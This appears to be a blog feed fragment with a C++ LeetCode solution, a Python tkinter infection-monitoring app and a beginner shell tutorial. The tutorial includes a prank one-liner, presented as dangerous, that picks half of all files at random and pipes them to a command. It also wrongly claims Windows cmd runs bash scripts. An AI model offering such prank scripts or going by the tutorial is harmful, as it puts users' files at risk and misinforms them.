    <content type="html"><![CDATA[<h1 id="Question"><a href="#Question" class="headerlink" title="Question"></a>Question</h1><p>Given a 32-bit signed integer, reverse digits of an integer</p><a id="more"></a><hr><h2 id="Example-1"><a href="#Example-1" class="headerlink" title="Example 1"></a>Example 1</h2><p>Input: 123<br>Output: 321</p><h2 id="Example-2"><a href="#Example-2" class="headerlink" title="Example 2"></a>Example 2</h2><p>Input: -123<br>Output: -321</p><h2 id="Example-3"><a href="#Example-3" class="headerlink" title="Example 3"></a>Example 3</h2><p>Input: 120<br>Output: 21</p><h2 id="Note"><a href="#Note" class="headerlink" title="Note"></a>Note</h2><p>Assume we are dealing with an environment which could only store integers within the 32-bit signed integer range: [âˆ’231,  231 âˆ’ 1]. For the purpose of this problem, assume that your function returns 0 when the reversed integer overflows.</p><h1 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h1><h2 id="Part-of-the-code-C"><a href="#Part-of-the-code-C" class="headerlink" title="Part of the code:(C++)"></a>Part of the code:(C++)</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line">    <span class="keyword">public</span>:</span><br><span class="line">        <span class="function"><span class="keyword">int</span> <span class="title">reverse</span><span class="params">(<span class="keyword">int</span> x)</span> </span>&#123;</span><br><span class="line">            <span class="keyword">int</span> rev = <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">while</span> (x != <span class="number">0</span>) &#123;</span><br><span class="line">                <span class="keyword">int</span> pop = x % <span class="number">10</span>;</span><br><span class="line">                x /= <span class="number">10</span>;</span><br><span class="line">                <span class="keyword">if</span> (rev &gt; INT_MAX/<span class="number">10</span> || (rev == INT_MAX / <span class="number">10</span> &amp;&amp; pop &gt; <span class="number">7</span>)) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">                <span class="keyword">if</span> (rev &lt; INT_MIN/<span class="number">10</span> || (rev == INT_MIN / <span class="number">10</span> &amp;&amp; pop &lt; <span class="number">-8</span>)) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">                rev = rev * <span class="number">10</span> + pop;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> rev;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="Link-to-GitHub"><a href="#Link-to-GitHub" class="headerlink" title="Link to GitHub"></a>Link to GitHub</h2><p><a href="https://github.com/yakumozoe/LeetCode/tree/master/Reverse%20Integer" target="_blank" rel="noopener"><strong>GITHUB</strong></a></p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;Question&quot;&gt;&lt;a href=&quot;#Question&quot; class=&quot;headerlink&quot; title=&quot;Question&quot;&gt;&lt;/a&gt;Question&lt;/h1&gt;&lt;p&gt;Given a 32-bit signed integer, reverse digits of an integer&lt;/p&gt;
    
    </summary>
    
      <category term="CS" scheme="http://zoec.info/categories/CS/"/>
    
    
      <category term="LeetCode" scheme="http://zoec.info/tags/LeetCode/"/>
    
      <category term="Algorithms" scheme="http://zoec.info/tags/Algorithms/"/>
    
      <category term="C++" scheme="http://zoec.info/tags/C/"/>
    
  </entry>
  
  <entry>
    <title>Infection Monitoring System</title>
    <link href="http://zoec.info/2018/08/30/Infection-Monitoring-System/"/>
    <id>http://zoec.info/2018/08/30/Infection-Monitoring-System/</id>
    <published>2018-08-30T09:06:23.000Z</published>
    <updated>2018-08-31T12:22:03.262Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Abstract"><a href="#Abstract" class="headerlink" title="Abstract"></a>Abstract</h1><p> An infection monitoring system based on HIS.</p> <a id="more"></a><hr><h1 id="Main"><a href="#Main" class="headerlink" title="Main()"></a>Main()</h1><p> 主函数 启动人机界面</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> gui_root <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> tkinter <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">gui_start</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="comment">#实例化一个窗口</span></span><br><span class="line">    ims_window = Tk()</span><br><span class="line">    ims = gui_root(ims_window)</span><br><span class="line">    <span class="comment">#设置根窗口默认属性</span></span><br><span class="line">    ims.set_ims_window()</span><br><span class="line">    <span class="comment">#父窗口进入事件循环</span></span><br><span class="line">    ims_window.mainloop()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">gui_start()</span><br></pre></td></tr></table></figure><h1 id="gui-root"><a href="#gui-root" class="headerlink" title="gui_root()"></a>gui_root()</h1><p> 第一次界面函数 根界面函数</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">gui_root</span><span class="params">()</span>:</span></span><br><span class="line"><span class="comment">#初始化</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, ims_window)</span>:</span></span><br><span class="line">    self.window = ims_window</span><br><span class="line"></span><br><span class="line"><span class="comment">#设置窗口属性</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">set_ims_window</span><span class="params">(self)</span>:</span></span><br><span class="line">    <span class="comment">#设置窗口名</span></span><br><span class="line">    self.window.title(<span class="string">"Infection Monitoring System"</span>)</span><br><span class="line"></span><br><span class="line">    self.menubar = Menu(self.window)</span><br><span class="line">    <span class="comment">#创建下拉菜单Patients,然后将其加入到顶级的菜单栏中</span></span><br><span class="line">    self.patientmenu = Menu(self.menubar, tearoff=<span class="number">0</span>)</span><br><span class="line">    <span class="comment">#创建新的病人信息窗口</span></span><br><span class="line">    self.patientmenu.add_command(label=<span class="string">"New"</span>, command=self.new_window)</span><br><span class="line">    self.patientmenu.add_command(label=<span class="string">"Print"</span>, command=self.print_window)</span><br><span class="line">    self.patientmenu.add_command(label=<span class="string">"Exit"</span>, command=self.window.quit)</span><br><span class="line">    self.menubar.add_cascade(label=<span class="string">"Patients"</span>, menu=self.patientmenu)</span><br><span class="line"></span><br><span class="line">    <span class="comment">#创建下拉菜单Diseases,然后将其加入到顶级的菜单栏中</span></span><br><span class="line">    self.diseasemenu = Menu(self.menubar, tearoff=<span class="number">0</span>)</span><br><span class="line">    self.diseasemenu.add_command(label=<span class="string">"New"</span>, command=self.new_disease)</span><br><span class="line">    self.diseasemenu.add_command(</span><br><span class="line">        label=<span class="string">"Search"</span>, command=self.search_window)</span><br><span class="line">    self.menubar.add_cascade(label=<span class="string">"Disease"</span>, menu=self.diseasemenu)</span><br><span class="line"></span><br><span class="line">    <span class="comment">#创建下拉菜单Help,然后将其加入到顶级的菜单栏中</span></span><br><span class="line">    self.helpmenu = Menu(self.menubar, tearoff=<span class="number">0</span>)</span><br><span class="line">    self.helpmenu.add_command(label=<span class="string">"About"</span>, command=self.about)</span><br><span class="line">    self.menubar.add_cascade(label=<span class="string">"Help"</span>, menu=self.helpmenu)</span><br><span class="line"></span><br><span class="line">    <span class="comment">#显示菜单</span></span><br><span class="line">    self.window.config(menu=self.menubar)</span><br><span class="line"></span><br><span class="line"><span class="comment">##所需函数</span></span><br><span class="line"><span class="comment">#测试函数</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">hello</span><span class="params">(self)</span>:</span></span><br><span class="line">    print(<span class="string">'hello'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#版权说明函数</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">about_test</span><span class="params">(self)</span>:</span></span><br><span class="line">    print(<span class="string">"Developer: Chen Ziyu"</span>)</span><br><span class="line">    print(<span class="string">"MIT Lisence"</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#创建新病人窗口</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">new_window</span><span class="params">(self)</span>:</span></span><br><span class="line">    self.new_window = Tk()</span><br><span class="line">    self.new_patient_window = gui_new_patient(self.new_window)</span><br><span class="line">    self.new_patient_window.set_new_patient_window()</span><br><span class="line">    self.new_window.mainloop()</span><br><span class="line"></span><br><span class="line"><span class="comment">#创建新疾病窗口</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">new_disease</span><span class="params">(self)</span>:</span></span><br><span class="line">    self.new_disease = Tk()</span><br><span class="line">    self.new_disease_window = gui_new_disease(self.new_disease)</span><br><span class="line">    self.new_disease_window.set_new_disease_window()</span><br><span class="line">    self.new_disease.mainloop()</span><br><span class="line"></span><br><span class="line"><span class="comment">#创建打印窗口</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">print_window</span><span class="params">(self)</span>:</span></span><br><span class="line">    self.print_window = Tk()</span><br><span class="line">    self.new_print_window = gui_print_window(self.print_window)</span><br><span class="line">    self.new_print_window.set_new_print_window()</span><br><span class="line">    self.print_window.mainloop()</span><br><span class="line"></span><br><span class="line"><span class="comment">#创建疾病查找窗口</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">search_window</span><span class="params">(self)</span>:</span></span><br><span class="line">    self.search_window = Tk()</span><br><span class="line">    self.new_search_window = gui_print_disease(self.search_window)</span><br><span class="line">    self.new_search_window.set_new_print_disease()</span><br><span class="line">    self.search_window.mainloop()</span><br><span class="line"></span><br><span class="line"><span class="comment">#创建About窗口</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">about</span><span class="params">(self)</span>:</span></span><br><span class="line">    self.about_window = Tk()</span><br><span class="line">    self.new_about_window = gui_about(self.about_window)</span><br><span class="line">    self.new_about_window.set_about_window()</span><br><span class="line">    self.about_window.mainloop()</span><br></pre></td></tr></table></figure><h1 id="病人类"><a href="#病人类" class="headerlink" title="病人类"></a>病人类</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">patient</span><span class="params">()</span>:</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self)</span>:</span></span><br><span class="line">    print(<span class="string">"创建病人类"</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">showinfo</span><span class="params">(self)</span>:</span></span><br><span class="line">    print(<span class="string">"病人信息如下 \n ID：%s \n 姓名：%s ，性别：%s ； \n 电话：%s ， 地址：%s \n 疾病： %s ，疾病ID：%s"</span> % (</span><br><span class="line">        self.id, self.name, self.gender, self.tel, self.address, self.disease_name, self.disease_id))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">saveinfo</span><span class="params">(self)</span>:</span></span><br><span class="line">    <span class="keyword">global</span> global_col</span><br><span class="line"></span><br><span class="line">    workbook = xlrd.open_workbook(<span class="string">'patients.xls'</span>)</span><br><span class="line">    workbooknew = copy(workbook)</span><br><span class="line">    ws = workbooknew.get_sheet(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">    ws.write(global_col, <span class="number">0</span>, self.id)</span><br><span class="line">    ws.write(global_col, <span class="number">1</span>, self.name)</span><br><span class="line">    ws.write(global_col, <span class="number">2</span>, self.gender)</span><br><span class="line">    ws.write(global_col, <span class="number">3</span>, self.tel)</span><br><span class="line">    ws.write(global_col, <span class="number">4</span>, self.address)</span><br><span class="line">    ws.write(global_col, <span class="number">5</span>, self.disease_name)</span><br><span class="line">    ws.write(global_col, <span class="number">6</span>, self.disease_id)</span><br><span class="line"></span><br><span class="line">    global_col = global_col+<span class="number">1</span></span><br><span class="line"></span><br><span class="line">    workbooknew.save(<span class="string">'patients.xls'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sava_a_info</span><span class="params">(self, r)</span>:</span></span><br><span class="line">    raw = r</span><br><span class="line">    workbook = xlrd.open_workbook(<span class="string">'patients.xls'</span>)</span><br><span class="line">    workbooknew = copy(workbook)</span><br><span class="line">    table = workbook.sheet_by_index(<span class="number">0</span>)</span><br><span class="line">    ws = workbooknew.get_sheet(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    ws.write(r, <span class="number">0</span>, table.cell(r, <span class="number">0</span>).value)</span><br><span class="line">    ws.write(r, <span class="number">1</span>, table.cell(r, <span class="number">1</span>).value)</span><br><span class="line">    ws.write(r, <span class="number">2</span>, table.cell(r, <span class="number">2</span>).value)</span><br><span class="line">    ws.write(r, <span class="number">3</span>, table.cell(r, <span class="number">3</span>).value)</span><br><span class="line">    ws.write(r, <span class="number">4</span>, table.cell(r, <span class="number">4</span>).value)</span><br><span class="line">    ws.write(r, <span class="number">5</span>, table.cell(r, <span class="number">5</span>).value)</span><br><span class="line">    ws.write(r, <span class="number">6</span>, table.cell(r, <span class="number">6</span>).value)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> int(table.cell(r, <span class="number">6</span>).value) == <span class="number">0</span>:</span><br><span class="line">        ws.write(r, <span class="number">7</span>, <span class="string">'无传染性疾病'</span>)</span><br><span class="line">    <span class="keyword">elif</span> int(table.cell(r, <span class="number">6</span>).value) == <span class="number">1</span>:</span><br><span class="line">        ws.write(r, <span class="number">7</span>, <span class="string">'甲型传染病'</span>)</span><br><span class="line">    <span class="keyword">elif</span> int(table.cell(r, <span class="number">6</span>).value) == <span class="number">2</span>:</span><br><span class="line">        ws.write(r, <span class="number">7</span>, <span class="string">'乙型传染病'</span>)</span><br><span class="line">    <span class="keyword">elif</span> int(table.cell(r, <span class="number">6</span>).value) == <span class="number">3</span>:</span><br><span class="line">        ws.write(r, <span class="number">7</span>, <span class="string">'丙型传染病'</span>)</span><br><span class="line"></span><br><span class="line">    workbooknew.save(<span class="string">'patients.xls'</span>)</span><br></pre></td></tr></table></figure><h1 id="疾病类"><a href="#疾病类" class="headerlink" title="疾病类"></a>疾病类</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">disease</span><span class="params">()</span>:</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self)</span>:</span></span><br><span class="line">    print(<span class="string">"创建疾病类"</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">saveinfo</span><span class="params">(self)</span>:</span></span><br><span class="line">    <span class="keyword">global</span> global_coll</span><br><span class="line"></span><br><span class="line">    workbook = xlrd.open_workbook(<span class="string">'diseases.xls'</span>)</span><br><span class="line">    workbooknew = copy(workbook)</span><br><span class="line">    ws = workbooknew.get_sheet(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">    ws.write(global_coll, <span class="number">0</span>, self.id)</span><br><span class="line">    ws.write(global_coll, <span class="number">1</span>, self.name)</span><br><span class="line"></span><br><span class="line">    workbooknew.save(<span class="string">'diseases.xls'</span>)</span><br><span class="line"></span><br><span class="line">    global_coll = global_coll+<span class="number">1</span></span><br></pre></td></tr></table></figure><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p> 该系统以python tkinter函数为基础构造人机交互界面，设计出传染病检测系统，可通过不同的接口嵌入到市面上主流的HIS系统中，方便快捷；因为navicat for mysql需要版权，所以构建系统时采用最原始的excel表存储数据，这是非常不明智的，以下为sql数据表构建代码：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">    <span class="keyword">CREATE</span> <span class="keyword">TABLE</span> Patient</span><br><span class="line">(</span><br><span class="line">    Pid <span class="built_in">INT</span> <span class="keyword">NOT</span> <span class="literal">NULL</span> ,</span><br><span class="line">    Pname <span class="built_in">VARCHAR</span> <span class="keyword">COLLATE</span> utf8_bin <span class="keyword">NOT</span> <span class="literal">NULL</span>,</span><br><span class="line">    Pgender <span class="built_in">VARCHAR</span> <span class="keyword">COLLATE</span> utf8_bin <span class="keyword">NOT</span> <span class="literal">NULL</span>,</span><br><span class="line">    Ptel <span class="built_in">INT</span> <span class="keyword">NOT</span> <span class="literal">NULL</span>,</span><br><span class="line">    Paddress <span class="built_in">VARCHAR</span> <span class="keyword">COLLATE</span> utf8_bin <span class="keyword">NOT</span> <span class="literal">NULL</span>,</span><br><span class="line">    Did <span class="built_in">INT</span> <span class="keyword">NOT</span> <span class="literal">NULL</span>,</span><br><span class="line">    Dname <span class="built_in">VARCHAR</span> <span class="keyword">COLLATE</span> utf8_bin <span class="keyword">NOT</span> <span class="literal">NULL</span>,</span><br><span class="line">    PRIMARY <span class="keyword">KEY</span> (Pid),</span><br><span class="line">    FOREIGN <span class="keyword">KEY</span> (Did) <span class="keyword">REFERENCES</span> Disease(Did),</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> Disease</span><br><span class="line">(</span><br><span class="line">    Did <span class="built_in">INT</span> <span class="keyword">NOT</span> <span class="literal">NULL</span> ,</span><br><span class="line">    Dname <span class="built_in">VARCHAR</span> <span class="keyword">COLLATE</span> utf8_bin <span class="keyword">NOT</span> <span class="literal">NULL</span>,</span><br><span class="line">    Dinfect <span class="built_in">BOOLEAN</span> <span class="keyword">NOT</span> <span class="literal">NULL</span>,</span><br><span class="line">    PRIMARY <span class="keyword">KEY</span> (Did),</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> Doctor</span><br><span class="line">(</span><br><span class="line">    DOid <span class="built_in">INT</span> <span class="keyword">NOT</span> <span class="literal">NULL</span> ,</span><br><span class="line">    DOname <span class="built_in">VARCHAR</span> <span class="keyword">COLLATE</span> utf8_bin <span class="keyword">NOT</span> <span class="literal">NULL</span>,</span><br><span class="line">    DOgender <span class="built_in">VARCHAR</span> <span class="keyword">COLLATE</span> utf8_bin <span class="keyword">NOT</span> <span class="literal">NULL</span>,</span><br><span class="line">    DOtel <span class="built_in">INT</span> <span class="keyword">NOT</span> <span class="literal">NULL</span>,</span><br><span class="line">    DOposition <span class="built_in">VARCHAR</span> <span class="keyword">COLLATE</span> utf8_bin <span class="keyword">NOT</span> <span class="literal">NULL</span>,</span><br><span class="line">    PRIMARY <span class="keyword">KEY</span> (DOid),</span><br><span class="line">)</span><br></pre></td></tr></table></figure><h1 id="最后再加一句"><a href="#最后再加一句" class="headerlink" title="最后再加一句"></a>最后再加一句</h1><p> 完整代码见<a href="https://github.com/yakumozoe" target="_blank" rel="noopener">GitHub个人仓库</a>中<a href="https://github.com/yakumozoe/HIS" target="_blank" rel="noopener">HIS专栏</a>,个人联系方式见<a href="https://zoec.info/about/">About</a></p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;Abstract&quot;&gt;&lt;a href=&quot;#Abstract&quot; class=&quot;headerlink&quot; title=&quot;Abstract&quot;&gt;&lt;/a&gt;Abstract&lt;/h1&gt;&lt;p&gt; An infection monitoring system based on HIS.&lt;/p&gt;
    
    </summary>
    
      <category term="BME" scheme="http://zoec.info/categories/BME/"/>
    
    
      <category term="Python" scheme="http://zoec.info/tags/Python/"/>
    
      <category term="Hospital Information System" scheme="http://zoec.info/tags/Hospital-Information-System/"/>
    
  </entry>
  
  <entry>
    <title>Let&#39;s Talk About Delete</title>
    <link href="http://zoec.info/2018/08/29/Let-s-Talk-About-Delete/"/>
    <id>http://zoec.info/2018/08/29/Let-s-Talk-About-Delete/</id>
    <published>2018-08-29T11:29:02.000Z</published>
    <updated>2018-08-31T12:12:37.251Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Announcement"><a href="#Announcement" class="headerlink" title="Announcement"></a>Announcement</h1><p>I Solemnly Swear That I Am Up To No Good</p><a id="more"></a><hr><h1 id="What’s-is-Shell"><a href="#What’s-is-Shell" class="headerlink" title="What’s is Shell"></a>What’s is Shell</h1><p> Shell is a computer program designed to be run by the command-line interpreter,as far as <a href="https://zh.wikipedia.org/wiki/%E6%AE%BC%E5%B1%A4" target="_blank" rel="noopener">Wikipedia</a>‘s concerned,typical operations performed by shell scripts include file manipulation, program execution, and printing text, while , a script which sets up the environment, runs the program, and does any necessary cleanup, logging, etc. is called a wrapper.</p><h1 id="The-Environment"><a href="#The-Environment" class="headerlink" title="The Environment"></a>The Environment</h1><p> Shell is a script language, just like java, php, python, javascript, etc., which can run in a script interpreter for interpretation execution and can be edited in the text editor.</p><p> There are many kinds of shell languages, for instance, C Shell(/usr/bin/csh), K Shell(/usr/bin/ksh),Bourne Again Shell(/bin/bash) and so on.</p><h1 id="Ur-First-Shell-Script"><a href="#Ur-First-Shell-Script" class="headerlink" title="Ur First Shell Script"></a>Ur First Shell Script</h1><p> Just open a text editor(vim,sublime,or even just the notepad !) and save as “helloworld.sh”.Write the following code in it.</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span>!/bin/bash</span><br><span class="line">echo "Hello World !"</span><br></pre></td></tr></table></figure><p> In the file, “#!” is an an agreed mark that tells the system what interpreter is needed to execute the script.</p><p> The “echo” command is used to output text to system command windows.</p><h1 id="Run-Ur-First-Shell-Script"><a href="#Run-Ur-First-Shell-Script" class="headerlink" title="Run Ur First Shell Script"></a>Run Ur First Shell Script</h1><p> Press both keys “win” and “R” and type “cmd” in the window and then tap “Enter”.You will call up the script interpreter.</p><p> <img src="/images/Let-s-Talk-About-Delete/1.png" alt="avatar"></p><p> Then, just drag the file “helloword.sh” into the new window and tap “Enter”, the Shell Command is running.</p><p> <img src="/images/Let-s-Talk-About-Delete/2.png" alt="avatar"></p><h1 id="Ur-Second-Shell-Script"><a href="#Ur-Second-Shell-Script" class="headerlink" title="Ur Second Shell Script"></a>Ur Second Shell Script</h1><p> Like ur first shell script, write the following code in a new .sh file and save as “test.sh”.</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span>!/bin/bash</span><br><span class="line">let i=`find . -type f | wc -l`/2 ; find . -type f -print0 | shuf -z -n $i | xargs -0 -- cat</span><br></pre></td></tr></table></figure><p> The more information about this code u can look up in my <a href="https://github.com/yakumozoe/Don-t-Use-It-" target="_blank" rel="noopener">GitHub Respositories</a></p><h1 id="Run-Ur-Second-Shell-Script"><a href="#Run-Ur-Second-Shell-Script" class="headerlink" title="Run Ur Second Shell Script"></a>Run Ur Second Shell Script</h1><p> <strong>WARNING</strong><br> <strong>WARNING</strong><br> <strong>WARNING</strong></p><p> <strong>If u don’t want to get in trouble,</strong><br>   <strong>DON’T RUN THAT CODE!</strong></p><p>  <strong>JUST THINK ABOUT THANOS</strong></p><p> <img src="/images/Let-s-Talk-About-Delete/3.jpg" alt="avatar"></p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;Announcement&quot;&gt;&lt;a href=&quot;#Announcement&quot; class=&quot;headerlink&quot; title=&quot;Announcement&quot;&gt;&lt;/a&gt;Announcement&lt;/h1&gt;&lt;p&gt;I Solemnly Swear That I Am Up To No Good&lt;/p&gt;
    
    </summary>
    
      <category term="CS" scheme="http://zoec.info/categories/CS/"/>
    
    
      <category term="Bad Codes" scheme="http://zoec.info/tags/Bad-Codes/"/>
    
      <category term="Database" scheme="http://zoec.info/tags/Database/"/>
    
      <category term="Shell" scheme="http://zoec.info/tags/Shell/"/>
    
  </entry>
  
  <entry>
    <title>Chatroom</title>
    <link href="http://zoec.info/2018/08/28/Chatroom/"/>
    <id>http://zoec.info/2018/08/28/Chatroom/</id>
    <published>2018-08-28T07:17:47.000Z</published>
    <updated>2018-08-31T12:22:22.546Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Abstract"><a href="#Abstract" class="headerlink" title="Abstract"></a>Abstract</h1><p>A small chatroom based on User Datagram Protocol</p><a id="more"></a><hr><h1 id="软件目的"><a href="#软件目的" class="headerlink" title="软件目的"></a>软件目的</h1><p> 实现简单的 UDP 实时聊天程序</p><h1 id="运行设备与环境"><a href="#运行设备与环境" class="headerlink" title="运行设备与环境"></a>运行设备与环境</h1><p> Windows 或 Linux 或 Mac OS<br> NodeJS 语言环境//Python 语言环境</p><h1 id="创新点"><a href="#创新点" class="headerlink" title="创新点"></a>创新点</h1><p> 采用脚本语言编写，适用于任何环境；<br> 分为 NodeJS 版本和 Python 版本，适用不同的机器；<br> 采用多线程方式，实现了聊天室基本的实时通信功能；<br> Python 版本为第一版本，仅通过线程池实现多线程解决了实时通信问题；NodeJS版本为最终版,实现基本的大型聊天室功能（上线提醒，多对多群聊，一对一实时通信，离线消息等）；</p><h1 id="关键代码"><a href="#关键代码" class="headerlink" title="关键代码"></a>关键代码</h1><h2 id="Python-基本版"><a href="#Python-基本版" class="headerlink" title="Python 基本版"></a>Python 基本版</h2><h3 id="服务器端接受线程实现-def-receive-message-server"><a href="#服务器端接受线程实现-def-receive-message-server" class="headerlink" title="服务器端接受线程实现 def receive_message(server)"></a>服务器端接受线程实现 def receive_message(server)</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span 